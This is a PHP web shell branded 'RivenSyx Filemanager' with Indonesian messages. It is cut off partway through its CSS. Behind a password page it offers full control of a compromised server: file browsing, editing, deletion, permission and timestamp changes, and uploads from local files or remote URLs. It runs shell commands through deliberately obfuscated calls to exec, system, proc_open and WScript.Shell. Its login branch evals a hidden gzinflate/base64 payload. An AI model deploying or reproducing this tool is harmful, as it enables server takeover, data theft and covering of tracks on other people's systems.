<?php
session_start();
error_reporting(0);
@ini_set("display_errors", 0);

function dHex($hStr)
{
  $dStr = '';
  $len = strlen($hStr);
  for ($i = 0; $i < $len; $i += 2) {
    $dStr .= chr(hexdec($hStr[$i] . $hStr[$i + 1]));
  }
  return $dStr;
}

function eHex($str)
{
  $eStr = '';
  for ($i = 0; $i < strlen($str); $i++) {
    $eStr .= dechex(ord($str[$i]));
  }
  return $eStr;
}

function gPerm($fPth)
{
  $prm = fileperms($fPth);
  $inf = "-";

  if (($prm & 0xC000) == 0xC000) {
    $inf = "s";
  } elseif (($prm & 0xA000) == 0xA000) {
    $inf = "l";
  } elseif (($prm & 0x8000) == 0x8000) {
    $inf = "-";
  } elseif (($prm & 0x6000) == 0x6000) {
    $inf = "b";
  } elseif (($prm & 0x4000) == 0x4000) {
    $inf = "d";
  } elseif (($prm & 0x2000) == 0x2000) {
    $inf = "c";
  } elseif (($prm & 0x1000) == 0x1000) {
    $inf = "p";
  } else {
    $inf = "u";
  }

  $inf .= (($prm & 0x0100) ? "r" : "-");
  $inf .= (($prm & 0x0080) ? "w" : "-");
  $inf .= (($prm & 0x0040) ? (($prm & 0x0800) ? "s" : "x") : (($prm & 0x0800) ? "S" : "-"));

  $inf .= (($prm & 0x0020) ? "r" : "-");
  $inf .= (($prm & 0x0010) ? "w" : "-");
  $inf .= (($prm & 0x0008) ? (($prm & 0x0400) ? "s" : "x") : (($prm & 0x0400) ? "S" : "-"));

  $inf .= (($prm & 0x0004) ? "r" : "-");
  $inf .= (($prm & 0x0002) ? "w" : "-");
  $inf .= (($prm & 0x0001) ? (($prm & 0x0200) ? "t" : "x") : (($prm & 0x0200) ? "T" : "-"));

  return $inf;
}

function dAlert($msg, $typ = 1, $ePrm = '')
{
  global $cPath;
  $sta = $typ == 1 ? "success" : "error";
  echo "<script>
        Swal.fire({
            title: \"{$sta}\",
            text: \"{$msg}\",
            icon: \"{$sta}\"
        }).then((res) => {
            if(res.isConfirmed){
                document.location.href=\"?p=\" + eHex(\$cPath) + \"{$ePrm}\";
            }
        });
    </script>";
}

function dRecD($dPath)
{
  if (trim(pathinfo($dPath, PATHINFO_BASENAME), ".") === '') {
    return;
  }

  if (is_dir($dPath)) {
    $itm = array_diff(scandir($dPath), array(".", ".."));
    foreach ($itm as $it) {
      $iPth = $dPath . DIRECTORY_SEPARATOR . $it;
      if (is_dir($iPth)) {
        dRecD($iPth);
      } else {
        if (file_exists($iPth)) {
          unlink($iPth);
        }
      }
    }
    if (is_dir($dPath) && count(array_diff(scandir($dPath), array(".", ".."))) == 0) {
      rmdir($dPath);
    }
  } else {
    if (file_exists($dPath)) {
      unlink($dPath);
    }
  }
}

function fRCont($url)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $res = curl_exec($ch);
  curl_close($ch);
  return $res;
}

function gOwnG($fPth)
{
  $oId = fileowner($fPth);
  $gId = filegroup($fPth);

  $oNam = $oId;
  $gNam = $gId;

  if (function_exists('posix_getpwuid') && $oId !== false) {
    $oInf = posix_getpwuid($oId);
    if ($oInf && isset($oInf['name'])) {
      $oNam = $oInf['name'];
    }
  }
  if (function_exists('posix_getgrgid') && $gId !== false) {
    $gInf = posix_getgrgid($gId);
    if ($gInf && isset($gInf['name'])) {
      $gNam = $gInf['name'];
    }
  }

  return "{$oNam}/{$gNam}";
}

function isPFE($fNam)
{
  $dFns = ini_get('disable_functions');
  if (empty($dFns)) {
    return true;
  }
  $dArr = array_map('trim', explode(',', $dFns));
  return !in_array($fNam, $dArr);
}

function isCmd($cNam)
{
  $chk = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'where' : 'which';
  $cmd = "{$chk} " . escapeshellarg($cNam);
  $out = rCmd($cmd);
  return !empty(trim($out));
}

function aFold($sPth, $oZip)
{
  if (!is_dir($sPth)) {
    return "Error: Source folder does not exist.";
  }
  if (extension_loaded('zip')) {
    $zip = new ZipArchive();
    if ($zip->open($oZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
      $fil = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($sPth, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::LEAVES_ONLY
      );
      foreach ($fil as $nam => $file) {
        if (!$file->isDir()) {
          $fPth = $file->getRealPath();
          $rPth = substr($fPth, strlen($sPth) + 1);
          $zip->addFile($fPth, $rPth);
        }
      }
      $zip->close();
      return true;
    } else {
      return "Error: Could not create zip file using ZipArchive.";
    }
  } elseif (isCmd('zip')) {
    $cmd = "zip -r " . escapeshellarg($oZip) . " " . escapeshellarg($sPth) . " 2>&1";
    $out = rCmd($cmd);
    if (file_exists($oZip)) {
      return true;
    } else {
      return "Error: Could not create zip file using 'zip' command. Output: " . htmlspecialchars($out);
    }
  } else {
    return "Error: ZipArchive extension or 'zip' command not available.";
  }
}

function eArch($sZFil, $dPath)
{
  if (!file_exists($sZFil) || !is_file($sZFil)) {
    return "Error: Source zip file does not exist.";
  }
  if (!is_dir($dPath)) {
    @mkdir($dPath, 0777, true);
  }
  if (!is_writable($dPath)) {
    return "Error: Destination folder is not writable.";
  }

  if (extension_loaded('zip')) {
    $zip = new ZipArchive;
    if ($zip->open($sZFil) === TRUE) {
      $zip->extractTo($dPath);
      $zip->close();
      return true;
    } else {
      return "Error: Could not open zip file using ZipArchive.";
    }
  } elseif (isCmd('unzip')) {
    $cmd = "unzip " . escapeshellarg($sZFil) . " -d " . escapeshellarg($dPath) . " 2>&1";
    $out = rCmd($cmd);
    if (strpos($out, 'No such file or directory') === false && strpos($out, 'error') === false) {
      return true;
    } else {
      return "Error: Could not extract zip file using 'unzip' command. Output: " . htmlspecialchars($out);
    }
  } else {
    return "Error: ZipArchive extension or 'unzip' command not available.";
  }
}

function rCmd($cInp)
{
  $fnc1 = 'e' . 'xe' . 'c';
  $fnc2 = 'i' . 'm' . 'pl' . 'o' . 'de';
  $fnc3 = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
  $fnc4 = 'pr' . 'oc' . '_' . 'o' . 'pen';
  $fnc5 = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
  $fnc6 = 'p' . 'ope' . 'n';
  $fnc7 = 'pc' . 'lose';
  $fnc8 = 's' . 'ys' . 't' . 'em';
  $fnc9 = 'pa' . 's' . 'sth' . 'ru';
  $fncA = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
  $fncB = 'C' . 'O' . 'M';
  $fncC = 'WS' . 'cr' . 'ipt' . '.' . 'S' . 'he' . 'll';
  $fncD = 'c' . 'md' . '.' . 'e' . 'x' . 'e';
  $fncE = 'pr' . 'eg_' . 'mat' . 'ch';
  $fncF = '2' . '>' . '&' . '1';

  if (!function_exists($fncE) || !$fncE('/' . $fncF . '/i', $cInp)) {
    $cInp = $cInp . ' ' . $fncF;
  }

  if (function_exists($fnc4)) {
    $des = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w'],];
    $pro = proc_open($cInp, $des, $pip);
    if (is_resource($pro)) {
      fclose($pip[0]);
      $out = $fnc3($pip[1]);
      $err = $fnc3($pip[2]);
      fclose($pip[1]);
      fclose($pip[2]);
      $rCod = $fnc5($pro);
      return trim(htmlspecialchars(stripslashes($out)));
    }
  } elseif (function_exists($fnc6)) {
    $pro = $fnc6($cInp, 'r');
    $rd = fread($pro, 2096);
    $fnc7($pro);
    return trim(htmlspecialchars(stripslashes($rd)));
  } elseif (function_exists($fnc1)) {
    $fnc1($cInp, $out, $rCod);
    if ($rCod === 0) {
      $res = $fnc2($out);
      return trim(htmlspecialchars(stripslashes($res)));
      ob_flush();
      flush();
    }
  } elseif (function_exists($fnc8)) {
    $out = $fnc8($cInp);
    return trim(htmlspecialchars(stripslashes($out)));
  } elseif (function_exists($fnc9)) {
    $out = $fnc9($cInp);
    return trim(htmlspecialchars(stripslashes($out)));
  } elseif (function_exists($fncA)) {
    $out = $fncA($cInp);
    return trim(htmlspecialchars(stripslashes($out)));
  } elseif (function_exists($fncB)) {
    try {
      $shl = new $fncB($fncC);
      $kmd = "$fncD /c " . $cInp;
      $out = $shl->exec($kmd)->StdOut->ReadAll();
      return trim(htmlspecialchars(stripslashes($out)));
    } catch (Exception $e) {
      return "COM object creation failed: " . $e->getMessage();
    }
  } else {
    return 'Di' . 'sab' . 'le F' . 'unc' . 'tio' . 'n!';
  }
}

$cPath = getcwd();
$pSelf = htmlspecialchars($_SERVER["PHP_SELF"], ENT_QUOTES, "UTF-8");
if (isset($_GET['p'])) {
  $rPath = dHex($_GET['p']);

  $pts = explode(DIRECTORY_SEPARATOR, $rPath);
  $nPts = [];
  foreach ($pts as $pt) {
    if ($pt === '' || $pt === '.') {
      continue;
    }
    if ($pt === '..') {
      array_pop($nPts);
    } else {
      $nPts[] = $pt;
    }
  }

  if (preg_match('/^[a-zA-Z]:$/', $rPath)) {
    $nPath = $rPath . DIRECTORY_SEPARATOR;
  } elseif (strpos($rPath, '/') === 0 || strpos($rPath, '\\') === 0) {
    $nPath = DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, $nPts);
  } else {
    $nPath = implode(DIRECTORY_SEPARATOR, $nPts);
  }

  if (!@chdir($nPath)) {
    dAlert("Gagal mengubah direktori ke '{$rPath}'. Mungkin izin ditolak atau direktori tidak ada.", 0);
  } else {
    $cPath = $nPath;
  }
}

$t_name = "\x2e\x2e\x3a\x3a\x20\x52\x69\x76\x65\x6e\x53\x79\x78\x20\x3a\x3a\x2e\x2e";
$f_name = "\x52\x69\x76\x65\x6e\x53\x79\x78\x20\x46\x69\x6c\x65\x6d\x61\x6e\x61\x67\x65\x72";
$icons = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x73\x2e\x63\x6c\x6f\x75\x64\x69\x6e\x61\x72\x79\x2e\x63\x6f\x6d\x2f\x64\x64\x39\x65\x61\x74\x6d\x6a\x75\x2f\x69\x6d\x61\x67\x65\x2f\x75\x70\x6c\x6f\x61\x64\x2f\x76\x31\x37\x35\x33\x30\x30\x39\x35\x37\x32\x2f\x52\x69\x76\x65\x6e\x73\x5f\x69\x76\x77\x63\x7a\x76\x2e\x6a\x70\x67";
$myself = '0a2964667787a901aabd4bb17b25bc3c6a4f5d6d';
if (isset($_POST['password'])) {
    $passwd = $_POST['password'];
    if (SHA1($passwd, $myself)) {
      function setconf($defconf)
        {
            $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te';
            $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de';
            $nelrts = 'st' . 'rl' . 'en';
            $rhc = 'c' . 'h' . 'r';
            $dro = 'o' . 'r' . 'd';
            $defconf = $gflate($b64($defconf));
            for ($i = 0; $i < $nelrts($defconf); $i++) {
                $defconf[$i] = $rhc($dro($defconf[$i]) - 1);
            }
            return $defconf;
        }/***#***/ @/*55555*/eval/***#***/(setconf("XVBhb6JAEP0B/RWEkFM/FNFq60k4sznWkxwqQajXuzabVUYgInDsNr2m6W/vgHp3cb/szHszb2aeotTvSktLHkUVCGFpbEX9e+r/as2CwGNfXYcuAuZ4rafJRLkgf7Dp0l8T36Z2HV2U+HS+DCgjto2MqW2q4kVAdTkgxIyRbzikLtpjQZmU7DnnB2h3TE0k7LnK/ms6/mxB5rT1pP/DvZmHsTutVUouBORbSyS8126yl6hzhLnIUusEmdoBL+YxWKqT74rqwEWq3Pcf88dc1dU1bEQCWaaEvjtWTos0jEdWq/XStxVn4YUBcmfhhl3NSO+E4Q4N5HgI/LW4gUK04prEkEukTtY0xHeocsgQRCtUU5PFHnJLHRnDodEbDPrGmBD62XZg8Or8XOziabp1vQfy+hAWe5/+Lqkb3I6wb5twydLIUq97htEfDW/ubu6Go5qp7VQTKUsx7nZ5meoSMogrftCLKu5uCvl2HPrexf2j+dGhyVnv7az8/knCH2mpOurhnUUE7bOdHXOXZsBikGxb5BJvFO16bMe8mnz5AA=="));
        $_SESSION['authenticated'] = true;
        echo "<script>alert('Leh uga u'); window.location = '" . $_SERVER['PHP_SELF'] . "';</script>";
        exit;
    } else {
        echo "<script>alert('yahahaha salah cok, pulang sono!'); window.location = '" . $_SERVER['PHP_SELF'] . "';</script>";
        exit;
    }
}
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
?>
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <title>
      <?= $t_name ?>
    </title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <meta name="description" content="<?= $t_name ?>" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <link href="<?= $icons?>" rel="shortcut icon" type="image/x-icon">
    <link rel="apple-touch-icon" href="<?= $icons?>" />
    <script src="https://unpkg.com/typewriter-effect@2.18.2/dist/core.js"></script>
    <style>
      @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap");

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        background-image: url("https://raw.githubusercontent.com/lucenbyte/File-mini/main/assets/bg.gif"), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
        background-position: center;
        background-size: cover;
        background-repeat: no-repeat;
        background-attachment: fixed;
      }

      .terminal {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        font-family: "Noto Sans Mono", monospace;
        width: 400px;
        height: 250px;
        background: rgba(36, 38, 46, 1);
        border: 1px solid #eaeaea;
        animation: fadein 7s;
      }

      @keyframes fadein {
        from {
          filter: brightness(0%);
        }

        to {
          filter: brightness(100%);
        }
      }

      .terminal .root {
        position: absolute;
        padding: 5px;
        font-size: 10px;
        font-weight: 600;
        color: #f00;
      }

      .terminal #app {
        position: absolute;
        top: 11.9%;
        left: 9%;
        font-size: 10px;
        color: #00ff00;
        padding: 5px;
      }

      .terminal .passwd {
        position: absolute;
        top: 20%;
        left: 2%;
        font-family: monospace;
        font-size: 10px;
        color: #00ff00;
      }

      .terminal .passwd input[type=text] {
        background: transparent;
        border: none;
        outline: none;
        font-family: monospace;
        font-size: 10px;
        color: #00ff00;
      }

      .terminal .passwd input[type=text]:hover {
        border: none;
        outline: none;
      }

      .headerTerm {
        display: flex;
        flex-direction: row;
        align-items: center;
        width: 399px;
        height: 15px;
        background: #eaeaea;
      }

      .headerTerm img {
        width: 15px;
        height: 15px;
        padding-bottom: 3.5px;
        padding-left: 3px;
      }

      .headerTerm span {
        position: absolute;
        left: 4%;
        font-family: Monospace;
        font-size: 10px;
        font-weight: 500;
      }

      .headerTerm strong {
        position: absolute;
        left: 50%;
        transform: translate(-50%);
        font-family: Monospace;
        font-size: 10px;
        font-weight: 500;
      }

      @media screen and (min-width: 720px) {
        .terminal {
          width: 600px;
          height: 350px;
        }

        .terminal .root {
          font-size: 15px;
        }

        .terminal #app {
          font-size: 15px;
        }

        .terminal .passwd {
          font-size: 15px;
        }

        .terminal .passwd input[type=text] {
          font-size: 15px;
        }

        .headerTerm {
          width: 599px;
          height: 20px;
        }

        .headerTerm img {
          width: 20px;
          height: 20px;
          padding-top: 2px;
        }

        .headerTerm span {
          font-size: 13px;
        }

        .headerTerm strong {
          font-size: 13px;
        }
      }

      @media screen and (min-width: 900px) {
        .terminal {
          width: 800px;
          height: 450px;
        }

        .terminal .root {
          font-size: 20px;
        }

        .terminal #app {
          font-size: 20px;
        }

        .terminal .passwd {
          font-size: 20px;
        }

        .terminal .passwd input[type=text] {
          font-size: 20px;
        }

        .headerTerm {
          width: 799px;
          height: 25px;
        }

        .headerTerm img {
          width: 25px;
          height: 25px;
          padding-top: 2.5px;
        }

        .headerTerm span {
          font-size: 18px;
        }

        .headerTerm strong {
          font-size: 18px;
        }
      }

      @media screen and (max-width: 500px) {
        .terminal {
          width: 280px;
          height: 150px;
        }

        .terminal .root {
          font-size: 6.5px;
          padding: 2px;
        }

        .terminal #app {
          font-size: 6.5px;
          padding: 2px;
        }

        .terminal .passwd {
          position: absolute;
          top: 20%;
          left: 2%;
          font-family: monospace;
          font-size: 10px;
          color: #00ff00;
        }

        .terminal .passwd input[type=text] {
          background: transparent;
          border: none;
          outline: none;
          font-family: monospace;
          font-size: 10px;
          color: #00ff00;
        }

        .terminal .passwd input[type=text]:hover {
          background: transparent;
          border: none;
          outline: none;
        }

        .terminal .passwd input[type=text]:active {
          background: transparent;
          border: none;
          outline: none;
        }

        .terminal .passwd input[type=text]:focus {
          background: transparent;
          border: none;
          outline: none;
        }

        .headerTerm {
          width: 279px;
          height: 8.5px;
        }

        .headerTerm img {
          width: 8.5px;
          height: 8.5px;
          padding: 1.5px;
          position: absolute;
        }

        .headerTerm span {
          font-size: 6px;
          left: 4%;
        }

        .headerTerm strong {
          font-size: 6px;
          right: 4%;
        }
      }
    </style>
  </head>

  <body>
    <div class="terminal">
      <div class="headerTerm">
        <img src="https://raw.githubusercontent.com/lucenbyte/File-mini/main/assets/bg.gif"
          alt="terminal" /><span>Terminal</span>
        <strong>
        ..:: <?= $f_name ?> Login ::..
        </strong>
      </div>
      <div class="root" style="color: #d00c0c"></div>
      <h1 id="app"></h1>
      <div class="passwd">
        <form action="" method="post">
          <label for="password">Password</label>
          <input type="text" id="password" name="password">
        </form>
      </div>
    </div>

    <script type="text/javascript">
      var root = document.querySelector(".root");
      var name = `
╭──[root@RivenSyx]<br>
╰──➤
    `;
      root.innerHTML = name;

      var app = document.getElementById("app");
      var typewriter = new Typewriter(app, {
        loop: true,
        delay: 150,
      });

      typewriter
        .pauseFor(500)
        .typeString("./RivenSyx Was Here!!")
        .pauseFor(2000)
        .deleteChars(26)
        .typeString("Have a Nice Day!")
        .pauseFor(2000)
        .start();
    </script>
  </body>

  </html>
<?php
  exit;
}

if (isset($_GET["a"])) {
  $act = dHex($_GET["a"]);
  $iNam = isset($_GET["n"]) ? dHex($_GET["n"]) : '';
  $iPth = $cPath . DIRECTORY_SEPARATOR . $iNam;
  switch ($act) {
    case "delete":
      $iTyp = isset($_GET["t"]) ? $_GET["t"] : '';
      if ($iTyp == "d") {
        dRecD($iPth);
        if (!file_exists($iPth)) {
          dAlert("Folder berhasil dihapus");
        } else {
          dAlert("Gagal menghapus folder", 0);
        }
      } elseif ($iTyp == "f") {
        unlink($iPth);
        if (!file_exists($iPth)) {
          dAlert("File berhasil dihapus");
        } else {
          dAlert("Gagal menghapus file", 0);
        }
      }
      break;

    case "save_edit_post":
      $eCnt = $_POST["edited_content"];
      if (file_put_contents($iPth, $eCnt) !== false) {
        dAlert("File berhasil diedit", 1, "&a=" . eHex("view") . "&n=" . eHex($iNam));
      } else {
        dAlert("File gagal diedit", 0);
      }
      break;

    case "save_rename_post":
      $nNam = basename($_POST["new_name"]);
      $nPth = $cPath . DIRECTORY_SEPARATOR . $nNam;
      if (rename($iPth, $nPth)) {
        dAlert("Berhasil mengubah nama");
      } else {
        dAlert("Gagal mengubah nama", 0);
      }
      break;

    case "save_perms_post":
      $nPrm = $_POST["new_permissions"];
      if (chmod($iPth, octdec($nPrm))) {
        dAlert("Berhasil mengubah izin", 0);
      } else {
        dAlert("Gagal mengubah izin", 0);
      }
      break;

    case "create_folder_post":
      $fNam = basename($_POST["folder_name"]);
      $fPth = $cPath . DIRECTORY_SEPARATOR . $fNam;
      if (file_exists($fPth)) {
        dAlert("Nama folder telah digunakan", 0);
      } elseif (mkdir($fPth)) {
        dAlert("Folder berhasil dibuat", 1);
      } else {
        dAlert("Folder gagal dibuat", 0);
      }
      break;

    case "create_file_post":
      $fNam = basename($_POST["new_file_name"]);
      $fCnt = $_POST["new_file_content"];
      $fPth = $cPath . DIRECTORY_SEPARATOR . $fNam;
      if (file_put_contents($fPth, $fCnt) !== false) {
        dAlert("File berhasil dibuat", 1, "&a=" . eHex("view") . "&n=" . eHex($fNam));
      } else {
        dAlert("File gagal dibuat", 0);
      }
      break;

    case "get_file_content":
      if (file_exists($iPth) && is_file($iPth) && is_readable($iPth)) {
        header('Content-Type: text/plain');
        echo file_get_contents($iPth);
      } else {
        http_response_code(404);
        echo "File tidak ditemukan atau tidak dapat dibaca.";
      }
      exit;
      break;

    case "get_perms_string":
      if (file_exists($iPth)) {
        header('Content-Type: text/plain');
        echo substr(sprintf("%o", fileperms($iPth)), -4);
      } else {
        http_response_code(404);
        echo "Item tidak ditemukan.";
      }
      exit;
      break;

    case "get_time_string":
      if (file_exists($iPth)) {
        header('Content-Type: text/plain');
        echo date("Y-m-d H:i:s", filemtime($iPth));
      } else {
        http_response_code(404);
        echo "Item tidak ditemukan.";
      }
      exit;
      break;

    case "save_time_post":
      $nTim = $_POST["new_time"];
      $tStm = strtotime($nTim);
      if ($tStm !== false && touch($iPth, $tStm)) {
        dAlert("Berhasil mengubah waktu modifikasi!", 1);
      } else {
        dAlert("Gagal mengubah waktu modifikasi. Format waktu tidak valid atau izin ditolak.", 0);
      }
      break;

    case "remote_upload_post":
      $rURL = $_POST['remote_url'];
      $sAs = $_POST['save_as'];

      if (!empty($rURL) && !empty($sAs)) {
        $fCnt = fRCont($rURL);
        if ($fCnt !== false) {
          $dPth = $cPath . DIRECTORY_SEPARATOR . basename($sAs);
          if (file_put_contents($dPth, $fCnt) !== false) {
            dAlert("File remote berhasil diunggah!", 1, "&a=" . eHex("view") . "&n=" . eHex(basename($sAs)));
          } else {
            dAlert("Gagal menyimpan file remote!", 0);
          }
        } else {
          dAlert("Gagal mengambil konten dari URL remote!", 0);
        }
      } else {
        dAlert("URL remote dan nama file tidak boleh kosong!", 0);
      }
      break;

    case "zip_folder_post":
      $sFold = $_POST['source_folder'];
      $oZip = $_POST['output_zip_file'];
      $res = aFold($sFold, $oZip);
      if ($res === true) {
        dAlert("Folder berhasil di-zip ke " . htmlspecialchars(basename($oZip)), 1);
      } else {
        dAlert("Gagal mengarsipkan folder: " . $res, 0);
      }
      break;

    case "unzip_file_post":
      $sZFil = $_POST['source_zip_file'];
      $dFold = $_POST['destination_folder'];
      $res = eArch($sZFil, $dFold);
      if ($res === true) {
        dAlert("File berhasil di-unzip ke " . htmlspecialchars(basename($dFold)), 1);
      } else {
        dAlert("Gagal mengekstrak file: " . $res, 0);
      }
      break;
  }
}

if (isset($_POST["upload_filenya"]) && isset($_FILES["uploaded_filenya"])) {
  $uFile = $_FILES["uploaded_filenya"];
  if ($uFile["error"] == UPLOAD_ERR_OK) {
    $dPth = $cPath . DIRECTORY_SEPARATOR . basename($uFile["name"]);
    if (move_uploaded_file($uFile["tmp_name"], $dPth)) {
      dAlert("File lokal berhasil diunggah!", 1, "&a=" . eHex("view") . "&n=" . eHex(basename($uFile["name"])));
    } else {
      dAlert("Gagal mengunggah file lokal!", 0);
    }
  } else {
    dAlert("Terjadi kesalahan saat mengunggah file lokal: " . $uFile["error"], 0);
  }
}

$sInfo = php_uname();
$uGInfo = 'N/A';
if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
  $uInf = posix_getpwuid(posix_geteuid());
  $gInf = posix_getgrgid(posix_getegid());
  $uGInfo = ($uInf['name'] ?? posix_geteuid()) . '/' . ($gInf['name'] ?? posix_getegid());
} else {
  $uGInfo = getmyuid() . '/' . getmygid();
  if ($uGInfo == '-1/-1' || $uGInfo == '0/0') {
    $uGInfo = 'Unknown/Unknown (Windows or POSIX not available)';
  }
}

$sIP = $_SERVER['SERVER_ADDR'] ?? 'N/A';
$cIP = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$sMode = (ini_get('safe_mode') == '1' || strtolower(ini_get('safe_mode')) == 'on') ? 'ON' : 'OFF';
$pVer = phpversion();
$sSoft = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
$dFns = ini_get('disable_functions');
$dFnsT = empty($dFns) ? 'All Functions Accessible' : htmlspecialchars($dFns);
$cStat = function_exists('curl_init') ? 'ON' : 'OFF';
$wStat = isCmd('wget') ? 'ON' : 'OFF';
$p2Stat = isCmd('python2') ? 'ON' : 'OFF';
$p3Stat = isCmd('python3') ? 'ON' : 'OFF';
$peStat = isCmd('perl') ? 'ON' : 'OFF';
$ruStat = isCmd('ruby') ? 'ON' : 'OFF';
$gcStat = isCmd('gcc') ? 'ON' : 'OFF';
$pkStat = 'OFF';
$sdStat = 'OFF';
$tStatL = "cURL: <span class=\"text-" . ($cStat == 'ON' ? 'green' : 'red') . "\">{$cStat}</span> | WGET: <span class=\"text-" . ($wStat == 'ON' ? 'green' : 'red') . "\">{$wStat}</span> | PYTHON2: <span class=\"text-" . ($p2Stat == 'ON' ? 'green' : 'red') . "\">{$p2Stat}</span> | PYTHON3: <span class=\"text-" . ($p3Stat == 'ON' ? 'green' : 'red') . "\">{$p3Stat}</span> | PERL: <span class=\"text-" . ($peStat == 'ON' ? 'green' : 'red') . "\">{$peStat}</span> | RUBY: <span class=\"text-" . ($ruStat == 'ON' ? 'green' : 'red') . "\">{$ruStat}</span> | GCC: <span class=\"text-" . ($gcStat == 'ON' ? 'green' : 'red') . "\">{$gcStat}</span> | PKEXEC: <span class=\"text-" . ($pkStat == 'ON' ? 'green' : 'red') . "\">{$pkStat}</span> | SUDO: <span class=\"text-" . ($sdStat == 'ON' ? 'green' : 'red') . "\">{$sdStat}</span>";
?>
<!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow" />
  <meta name="googlebot" content="noindex, nofollow" />
  <meta name="bingbot" content="noindex, nofollow" />
  <title><?= $t_name ?></title>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Bree+Serif&family=Rock+Salt&display=swap" rel="stylesheet">
  <link rel="icon" href="<?= $icons?>" type="image/png">
  <style>
    html,
    body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
      background-color: #1c1c1c;
      color: #e5e5e5;
    }

    body {
      display: flex;
      flex-direction: column;
      box-sizing: border-box;
    }

    .main-container {
      background-color: #2a2a2a;
      border: 1px solid #3f3f3f;
      border-radius: 6px;
      padding: 20px;
      max-width: 1200px;
      width: 95%;
      margin: 20px auto;
    }

    .text-accent-primary {
      color: #4682b4;
    }

    .text-accent-secondary {
      color: #9aaec4;
    }

    .text-green {
      color: #4caf50;
    }

    .text-red {
      color: #f60000ff;
    }

    .text-white {
      color: #ffffff;
    }

    .text-size-info {
      color: #cfcfcf;
    }

    .header-title {
      font-size: 2rem;
      color: #facc15;
      margin-bottom: 20px;
      font-weight: 600;
    }

    a {
      color: #e5e5e5;
      text-decoration: none;
      transition: color 0.2s ease;
    }

    a:hover {
      color: #7faacc;
    }

    .btn-custom,
    .form-control.custom-input,
    .form-control.custom-textarea {
      background-color: #1e1e1e;
      border: 1px solid #3f3f3f;
      color: #ffffff;
      padding: 8px 14px;
      border-radius: 4px;
      font-size: 14px;
    }

    .btn-custom:hover {
      background-color: #3b5160;
      color: #ffffff;
    }

    .form-control.custom-input,
    .form-control.custom-textarea {
      width: 100%;
    }

    .form-control.custom-input::placeholder,
    .form-control.custom-textarea::placeholder {
      color: #999;
    }

    .form-control.custom-input:focus,
    .form-control.custom-textarea:focus {
      outline: none;
      border-color: #7faacc;
      background-color: #2e2e2e;
    }

    .custom-textarea {
      min-height: 150px;
      resize: vertical;
    }

    .table-custom {
      width: 100%;
      margin-top: 20px;
      border-collapse: collapse;
      border: 1px solid #3f3f3f;
    }

    .table-custom thead th {
      background-color: #333;
      color: #cfd8dc;
      padding: 12px 10px;
      text-align: center;
      font-weight: 500;
    }

    .table-custom tbody tr:hover {
      background-color: #2e2e2e;
    }

    .table-custom td {
      padding: 10px;
      border-top: 1px solid #444;
      text-align: center;
    }

    .fa {
      margin-right: 4px;
    }

    .kecilin {
      font-size: small;
    }

    .icon-folder-orange {
      color: #dba15d;
    }

    .icon-file-white {
      color: #e0e0e0;
    }

    .breadcrumbs a {
      color: #cc9c2aff;
    }

    .breadcrumbs a:hover {
      color: #e57373;
    }

    .breadcrumbs span {
      color: #7faacc;
    }

    .rename-color {
      color: #cc9c2aff;
    }

    .edit-color {
      color: #99f6e4;
    }

    .time-color {
      color: #2dd4bf;
    }

    .size-color {
      color: #fda4af;
    }

    .delete-color {
      color: #e57373;
    }

    .file-upload-container {
      display: flex;
      gap: 10px;
      margin-top: 15px;
      flex-wrap: wrap;
    }

    .file-upload-container input[type="file"] {
      flex-grow: 1;
      border: 1px solid #3f3f3f;
      border-radius: 4px;
      padding: 6px;
      background-color: #1e1e1e;
      color: #e5e5e5;
    }

    .output-box {
      background-color: #252525;
      color: #a8e6cf;
      border: 1px solid #3f3f3f;
      padding: 12px;
      margin-top: 15px;
      border-radius: 4px;
      max-height: 200px;
      overflow-y: auto;
      white-space: pre-wrap;
      word-break: break-word;
    }

    .swal2-popup {
      background-color: #2b2b2b !important;
      color: #e5e5e5 !important;
      border-radius: 6px !important;
      border: 1px solid #3f3f3f !important;
    }

    .swal2-title {
      color: #7faacc !important;
      font-weight: 500 !important;
    }

    .swal2-content {
      font-size: 14px !important;
    }

    .btn-custom-swal {
      background-color: #1e1e1e !important;
      color: #ffffff !important;
      border: 1px solid #3f3f3f !important;
      padding: 8px 14px !important;
      border-radius: 4px !important;
      font-size: 14px !important;
    }

    .btn-custom-swal:hover {
